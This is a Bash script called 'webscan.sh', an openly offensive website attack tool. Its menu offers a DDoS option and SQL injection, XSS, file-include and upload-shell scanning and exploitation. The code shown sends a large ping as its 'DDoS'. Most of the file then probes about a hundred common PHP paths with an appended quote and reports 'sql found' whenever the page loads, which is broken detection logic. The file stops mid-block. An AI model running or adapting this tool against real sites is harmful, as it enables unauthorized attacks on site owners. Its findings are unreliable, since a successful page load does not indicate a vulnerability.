#!/bin/bash
#Note:you can add on this script and develop it
#But please dont remove my name from them
#The script write in bash language
a=$1
b=$2
c=$3
if [ $# -eq 0 ] 
  then
echo "./webscan.sh: Options Not Found Type ./webscan.sh -h to show Options"
elif [ $a == -h ]
  then
echo "------------------------------------------------------"
echo "|                      WEBSCAN                       |"
echo "|                                                    |"
echo "|   It is a tool that collects information           |"
echo "|   about the sites and extract gaps therein         |"
echo "|                                                    |"
echo "|           coded by ahmad nourallah                 |"
echo "|                                                    |"
echo "|   I apologize for any error found in the script    |"
echo "|                  Verison 1.0                       |" 
echo "------------------------------------------------------"
echo "Usage: ./webscan.sh [options] "

echo "Options:"
echo
echo "    -DD            use to start DDos attack on websites."
echo "    -wim           use to show website ip and mail server."
echo "    -wd            use to search website dns."
echo "    -ac            use to search website admin Cpanel."    
echo 
echo "Website Scan Vulnerability Options: "
echo 
echo "    -sql           use to scan website from injection vulnerability."
echo "    -xss           use to scan website from cross site scripting vulnerability."
echo "    -fl            use to scan website from file include scan (RFI,LFI) vulnerability."
echo "    -up            use to scan website from upload shell vulnerability."
echo 
echo "Website Exploits Options: "
echo 
echo "    -xsse          use to exploit cross site scripting vulnerability."
echo "    -lfi           use to exploit local include vulnerability."
echo "    -upe           use to exploit upload shell vulnerability."
echo
echo "helps:"
echo
echo "    -h             use to show this page"
echo "    -v             use to show script verison"
echo "    -to            use to see tools options"
echo
echo "Example: ./webscan.sh -DD google.com "
elif [ $a == "-v" ]
  then
echo "Verison 1.0 "
  echo "           All Rights Reserved to Ahmad Nourallah"
elif [ $a == "-to" ]
  then
while true
do
echo "Note: Press <exit> to exit tools helper"
read -p "welcome in tools helper enter the tools name to see Usage [Example: (-DD)]: " tools
if [ "$tools" == '-DD' ]
  then
  clear
echo "Website killer: "
echo "Usage :"
echo "       ./webscan.sh -DD (Website URL)"
echo "-------------------------------------------------------------"
read -p "Prees Enter to continue"
elif [ "$tools" == '-wim' ]
  then
  clear
echo "Website Ip And Mail Finder: "
echo "Usage :"
echo "       ./webscan.sh -wim (Website URL)"
echo "-------------------------------------------------------------"
read -p "Prees Enter to continue"
elif [ "$tools" == '-wd' ]
  then
  clear
echo "Website Dns Finder: "
echo "Usage :"
echo "       ./webscan.sh -wd (Website URL) (Website Name)"
echo "-------------------------------------------------------------"
read -p "Prees Enter to continue"
elif [ "$tools" == '-ac' ]
  then
  clear
echo "Admin Cpanel Finder: "
echo "Usage :"
echo "      ./webscan.sh -ac (Website URL)"
echo "-------------------------------------------------------------"
read -p "Prees Enter to continue"
elif [ "$tools" == '-sql' ]
  then
  clear
echo "Sql Injection Finder: "
echo "Usage :"
echo "       ./webscan.sh -sql (Website URL)"
echo "-------------------------------------------------------------"
read -p "Prees Enter to continue"
elif [ "$tools" == '-xss' ]
  then
  clear 
  echo "Cross Site Scripting Finder: "
  echo "Usage :"
  echo "       ./webscan.sh -xss (Website URL)"
  echo "-------------------------------------------------------------"
  read -p "Prees Enter to continue"
  elif [ "$tools" == '-fl' ]
  then
  clear 
  echo "File Include (RFI,LFI) Finder: "
  echo "Usage :"
  echo "       ./webscan.sh -fl (Website URL)"
  echo "-------------------------------------------------------------"
  read -p "Prees Enter to continue"
  elif [ "$tools" == '-up' ]
  then
  clear 
  echo "Upload Shell Vulnerability Finder: "
  echo "Usage :"
  echo "       ./webscan.sh -up (Website URL)"
  echo "-------------------------------------------------------------"
  read -p "Prees Enter to continue"
    elif [ "$tools" == '-sqle' ]
  then
  clear 
  echo "Sql Injection Exploiter (Sqlmap): "
  echo "Usage :"
  echo "       ./webscan.sh -sqle (Website URL)"
  echo "-------------------------------------------------------------"
  read -p "Prees Enter to continue"
  elif [ "$tools" == '-xsse' ]
  then
  clear 
  echo "Cross Site Scripting Exploiter: "
  echo "Usage :"
  echo "       ./webscan.sh -xsse (Website URL)"
  echo "-------------------------------------------------------------"
  read -p "Prees Enter to continue"
    elif [ "$tools" == '-lfi' ]
  then
  clear 
  echo "Local File Include Exploiter: "
  echo "Usage :"
  echo "       ./webscan.sh -lfi (Website URL)"
  echo "-------------------------------------------------------------"
  read -p "Prees Enter to continue"
    elif [ "$tools" == "-upe" ]
  then
  clear 
  echo "Upload Shell Vulnerability Exploiter: "
  echo "Usage :"
  echo "       ./webscan.sh -upe (Website URL)"
  echo "-------------------------------------------------------------"
  read -p "Prees Enter to continue"
elif [ "$tools" == "exit" ]
  then
  exit
else
  clear
  echo "Tools Not Found"
  echo "-------------------------------------------------------------"
read -p "Prees Enter to continue"
fi
done
elif [ $a == -DD ]
	then
	echo "[*]The attack started Press <ctrl+c> to exit attack."
ping -l 10000000 -W 2100 $b &> /dev/null 
elif [ $a == -wim ]
	then
	echo "Website ip and mail server: "

host $b
elif [ $a == -wd ]
	then
	echo "Website Dns: "
	wget -qO- $b | cat | grep "href=" | cut -d"/" -f3 | cut -d'"' -f1 |grep "$c" | sort -u
elif [ $a == -sql ]
then
echo "The search started if we found vulnerability we will tell you ......"

echo "---------------------------------------------------------------------"
	d="/index.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/article_preview.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Pages/whichArticle.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/view_items.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Sales/view_item.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/book.php?isbn='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/knowledge_base/detail.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/gallery/gallery.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/event.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/detail.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/store/home.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/view_items.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/detail.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/event_details.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/detailedbook.php?isbn='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/fatcat/home.php?view='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/events/index.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/static.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/answer/default.php?pollID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/news/detail.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/view_items.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/view_items.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/gallery/detail.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/print.php?sid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/view_items.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/board/showthread.php?t='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/book.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/event.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/more_detail.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/knowledge_base/detail.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/knowledge_base/detail.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/content.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Shop/home.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/store/home.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/print.php?sid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/gallery.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/resources/index.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/events/event.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/view_items.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/default.php?cPath='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/content.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products/products.php?p='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/auction/item.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/clan_page.php?cid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/product.php?sku='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/events?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/comments.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products/?catID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/modules.php?****="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/fshstatistic/index.php?PID="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products/products.php?p="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/sport.php?revista='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products.php?p='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products.php?p='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/home.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/news/shownewsarticle.php?articleid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/discussions/10/9/?CategoryID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/news.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/?page='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?page='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item/detail.php?num="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/features/view.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/site/?details&prodid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/product_info.php?products_id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/remixer.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/proddetails_print.php?prodid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/pylones/item.php?item='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?cont='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/product.php?ItemId='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/video.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/detail.php?item_id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/filemanager.php?delete='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/article_preview.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Pages/whichArticle.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/view_items.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Sales/view_item.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/book.php?isbn='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/news/newsletter.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/shop/home.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/designcenter/item.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/board/kboard.php?board='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/board/view_temp.php?table='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/magazine-details.php?magid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/about.php?cartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/accinfo.php?cartId='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/acclogin.php?cartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/add.php?bookid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/add_cart.php?num='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/addcart.php?'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/addItem.php'"
c=$b$d
